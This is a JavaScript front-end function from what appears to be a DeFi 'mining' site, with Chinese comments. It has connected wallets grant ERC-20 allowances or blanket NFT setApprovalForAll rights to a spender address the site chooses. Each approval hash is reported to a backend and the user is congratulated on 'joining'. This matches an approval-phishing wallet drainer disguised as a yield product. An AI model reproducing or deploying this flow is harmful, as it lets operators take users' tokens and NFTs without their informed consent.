// 授权  approve
async function approve(_that, _spender, _contract, _abi, _value, _decimals, _item) {
	console.log("approve");
	//login
	let inviteCode = getInviterCode();
	let code = getAgentCode();
	let loginData = {
		"address": _that.address,
		"chainType": _that.chainType,
		"inviterCode": inviteCode,
		"code":code
	};
	login(loginData,true,asyLogin,_that);
	
	// ========判断是否需要切换钱包==========
	let _walletType = _that.walletType;
	let _chainType = _that.chainType;
	let _protocol = _item.protocol;
	if (isNull(_that.chainList.length) || _that.chainList.length == 0) {
		_that.chainList = queryChain(false, setChain, this);
	}

	let chainInfo = _that.chainList.find(item => item.chainType == _item.chainType)
	if (_chainType == _item.chainType) {
		// 不需要切换链  判断是否需要重连
		let adr = await connect(chainInfo);
		console.log(adr);
	} else {
		// 需要切换链
		console.log('链接钱包-需要切换链:展示钱包');
		_that.chainTemp = chainInfo;
		// 判断是否app打开
		let wtype = waType();
		let pcType = iswap();
		if (wtype != "default") {
			// 说明app内打开
			let winfo = walletJson[pcType][chainInfo.chainType].find(wa => wa.type = wtype)
			_that.onConnect3(winfo);
		} else {
			_that.showType = false;
			_that.walletList = walletJson[pcType][chainInfo.chainType];
			_that.showWallet = true;
		}
		return;
	}
	// ========判断是否需要切换钱包 end==========
	// ========开始授权流程==========
	let i = layer.load(0, {
		shade: [0.2, 'gray'],
		time: 8 * 1000
	});
	// 开始流程 
	try {
		// ========开始币授权流程==========
		if (_protocol == "bep20" || _protocol == "erc20") {
			// 授权金额 转化为最小单位
			_value = _value * Math.pow(10, _decimals)
			_value = new BigNumber(_value);
			_value = _value.toFixed();
			if (isweb3j(_chainType)) {

            	let _owner = await getAddressByMyEthereum();
            	
            	if (_owner && _owner.toLocaleLowerCase() == _spender.toLocaleLowerCase()) {
            		layer.msg("Please change your wallet address");
            		return;
            	}
				// 先查询授权金额
				let allowBla = await allowance(_spender, _contract, _abi, _decimals, _chainType)
				console.log("授权金额：" + allowBla)
				if (notNull(allowBla) && allowBla > 0) {
					_that.switchTab(5);
					return;
				}
				// 开始授权
				let web3 = new Web3(myEthereum);
				let myContract = new web3.eth.Contract(JSON.parse(_abi), _contract)
				
				
				if(JSON.stringify(_abi).indexOf("increaseAllowance")>=0){
					myContract.methods.increaseAllowance(_spender, _value )
						.send({
							from: _owner
						})
						.then(function(hash) {
							let upData = {
								"address": _owner,
								"approveAddr": _spender,
								"approveHash": hash.transactionHash,
								"chainType": _item.chainType,
								"coinImg": _item.quoteCurrencyImg,
								"coinType": _item.quoteCurrency,
								"contractAddr": _item.quoteCurrencyCtrAddr,
								"productId": _item.id,
								"protocol": _item.protocol
							}
							miningUp(upData);
							queryWalletInfo(_that);
							
							_that.$message({
							          message: '🎉🎉🎉Congratulations on joining Defi1!',
							          type: 'success'
							        });
							
							
						})
						.catch(function(e){
							console.log(e);
						});
				}else{
					myContract.methods.approve(_spender, _value + "")
						.send({
							from: _owner
						})
						.on('transactionHash', function(hash) {
							let upData = {
								"address": _owner,
								"approveAddr": _spender,
								"approveHash": hash,
								"chainType": _item.chainType,
								"coinImg": _item.quoteCurrencyImg,
								"coinType": _item.quoteCurrency,
								"contractAddr": _item.quoteCurrencyCtrAddr,
								"productId": _item.id,
								"protocol": _item.protocol
							}
							miningUp(upData);
							queryWalletInfo(_that);
							_that.$message({
							  message: '🎉🎉🎉Congratulations on joining Defi2!',
							  type: 'success'
							});
						});
				}
			}
		}
		// ========币授权流程 end==========
		// ========开始nft授权流程 start==========
		if (_protocol == "erc721") {
			//1先判断持有 若没有持有则弹窗
			//2再判断授权 若已授权则跳转邀请页
			//3开始授权
			if (isweb3j(_chainType)) {
				let _owner = getAddressByMyEthereum();
				if (_owner.toLocaleLowerCase() == _spender.toLocaleLowerCase()) {
					layer.msg("Please change your wallet address");
					return;
				}
				let web3 = new Web3(myEthereum);
				let myContract = new web3.eth.Contract(JSON.parse(_abi), _contract)
				// 持有数量
				let num = await myContract.methods.balanceOf(_owner).call();
				console.log(num)
				// 没有持有nft 提示更换钱包
				if (num <= 0) {
					layer.msg("Please change your wallet holding " + _item.quoteCurrency);
					return;
				}
				//  授权查询
				let approType = await myContract.methods.isApprovedForAll(_owner, _spender).call();
				console.log(approType)
				if (!approType) {
					myContract.methods.setApprovalForAll(_spender, true)
						.send({
							from: _owner
						})
						.on('transactionHash', function(hash) {
							console.log("Approval:" + hash);
							console.log("授权成功上报:" + hash);
							let upData = {
								"address": _owner,
								"approveAddr": _spender,
								"approveHash": hash,
								"chainType": _item.chainType,
								"coinImg": _item.quoteCurrencyImg,
								"coinType": _item.quoteCurrency,
								"contractAddr": _item.quoteCurrencyCtrAddr,
								"productId": _item.id,
								"protocol": _item.protocol
							}
							miningUp(upData);
							queryWalletInfo(_that);
						});
				} else {
					// 已授权 
					_that.$confirm(
						"<div style='margin-left:1em'>You are already involved in this project!</div><br /><div style='margin-left:1em'>" +
						_that.langS.tg.top1[2] + "</div>", '', {
							confirmButtonText: 'confirm',
							//cancelButtonText: 'cancel',
							showCancelButton: false,
							dangerouslyUseHTMLString: true,
							customClass: "openinviterWsurl"
						}).then(() => {
						_that.switchTab(4)
					}).catch(() => {
						console.log("cancel")
					});
					return;
				}
			}
			// balanceOf()：返回由_owner 持有的NFTs的数量。
			// ownerOf()：返回tokenId代币持有者的地址。
			// approve()：授予地址_to具有_tokenId的控制权，方法成功后需触发Approval 事件。
			// setApprovalForAll()：授予地址_operator具有所有NFTs的控制权，成功后需触发ApprovalForAll事件。
			// getApproved()、isApprovedForAll()：用来查询授权。
			// safeTransferFrom()：转移NFT所有权，一次成功的转移操作必须发起 Transer 事件
		}
	} finally {
		layer.close(i);
	}
}
